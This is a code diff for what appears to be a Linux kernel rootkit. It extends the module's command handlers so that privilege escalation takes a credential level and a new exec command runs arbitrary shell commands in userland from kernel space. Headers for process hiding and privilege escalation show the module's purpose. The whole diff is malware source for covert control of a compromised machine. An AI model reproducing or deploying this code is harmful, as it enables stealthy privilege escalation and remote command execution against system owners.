@@ -1,9 +1,11 @@
 #include <linux/kernel.h>
 #include <linux/module.h>
+#include <linux/slab.h>
 
 #include "commands.h"
 #include "privilege_escalation.h"
 #include "hide_proc.h"
+#include "userland_exec.h"
 
 int commands_priv_handler(int argc, char **argv);
 int commands_proc_handler(int argc, char **argv);
@@ -50,7 +52,7 @@ int commands_priv_handler(int argc, char **argv)
 	ketopt_t o = KETOPT_INIT;
 
 	int pid = INVALID_PID;
-	int perm = 0;
+	int perm = DEFAULT_CRED;
 
 	while ((c = ketopt(&o, argc, argv, 1, "", priv_longopts)) >= 0) {
 		switch (c) {
@@ -82,16 +84,42 @@ int commands_priv_handler(int argc, char **argv)
 	}
 
 	if (!err) {
-		escalate_pid(pid);
+		escalate_pid(pid, perm);
 	}
 
 	return err ? -EINVAL : 0;
+}
+
+char *gather_exec_args(int argc, char **argv, ketopt_t o)
+{
+	int str_len, arr_ind;
+	char *exec_arg = kmalloc(EXEC_CMD_MAX_LEN * sizeof(char), GFP_KERNEL);
+
+	str_len = 0;
+	exec_arg[0] = '\0';
+
+	for (arr_ind = o.ind - 1; arr_ind < argc; arr_ind++) {
+		if (str_len + 1 + strlen(argv[arr_ind]) <= EXEC_CMD_MAX_LEN) {
+			if (str_len != 0) {
+				strcat(exec_arg, " ");
+			}
+			strcat(exec_arg, argv[arr_ind]);
+			str_len += 1 + strlen(argv[arr_ind]);
+		} else {
+			return NULL;
+		}
+	}
+
+	return exec_arg;
 }
 
 int commands_proc_handler(int argc, char **argv)
 {
 	int err = 0;
 	int c;
+
+	int pid_return;
+	char *exec_arg;
 	ketopt_t o = KETOPT_INIT;
 
 	while ((c = ketopt(&o, argc, argv, 1, "", proc_longopts)) >= 0) {
@@ -113,7 +141,29 @@ int commands_proc_handler(int argc, char **argv)
 		case OPT_PROC_KILL:
 			break;
 		case OPT_PROC_EXEC:
-			break;
+			if (o.arg) {
+				exec_arg = gather_exec_args(argc, argv, o);
+
+				if (exec_arg == NULL) {
+					err++;
+					break;
+				}
+
+				printk(KERN_INFO
+				       "[API] Calling bash_exec with |%s|",
+				       exec_arg);
+
+				pid_return = bash_exec(exec_arg);
+
+				if (pid_return < 0) {
+					err++;
+				} else {
+					printk(KERN_INFO
+					       "[API] Process successfully executed, pid %d\n",
+					       pid_return);
+				}
+				break;
+			}
 		}
 	}
 
